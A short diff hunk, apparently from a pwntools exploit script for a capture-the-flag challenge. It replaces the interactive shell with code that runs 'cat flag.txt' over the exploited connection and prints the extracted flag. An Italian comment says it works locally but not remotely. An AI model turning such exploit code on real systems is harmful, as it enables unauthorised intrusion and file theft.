@@ -136,6 +136,9 @@ payload = flat({
 })
 
 p.send(payload)
-
-p.interactive()
+p.sendline(b'cat flag.txt')
+flag = p.recvuntil(b'}')
+flag = flag[flag.index(b'flag{'):].decode()
+p.close()
+print(flag)
 # funziona in locale ma non in remoto
